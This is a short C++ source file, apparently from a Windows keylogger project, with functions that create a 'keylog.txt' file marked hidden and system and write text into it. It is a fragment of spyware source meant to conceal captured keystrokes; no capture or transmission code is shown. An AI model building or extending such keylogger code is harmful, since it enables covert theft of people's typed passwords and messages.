#include "KeyLogger.h"

HANDLE CreateNewLoggingFile(std::string fileLocation)
{
    std::string fileString;
    TCHAR buffer[BUFSIZE];
    std::string fileName = "keylog.txt";
	
    if (	fileLocation.empty() ||
            fileLocation.length() > MAX_PATH ||
            fileLocation.find_first_of("\\/:*?\"<>|") != std::string::npos)
    {
        GetCurrentDirectory(BUFSIZE, buffer);
        std::wstring wstr = buffer;
        fileString = (std::string(wstr.begin(), wstr.end()) + "\\" + fileName);
    }
    else
    {
        fileString = fileLocation + "\\" + fileName;
    }

    std::cout << "Log file location: " << fileString << std::endl;
	
    const LPCSTR file_name = fileString.c_str();
    return CreateFileA(
        file_name,
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY,
        nullptr
    );
}

void WriteToLoggingFile(const std::string& text, const HANDLE file)
{
    DWORD dwBytesToWrite = strlen(text.c_str());
    const LPCVOID lpBuffer = text.c_str();
	
    WriteFile(
        file,
        lpBuffer,
        dwBytesToWrite,
        &dwBytesToWrite,
    nullptr);
}
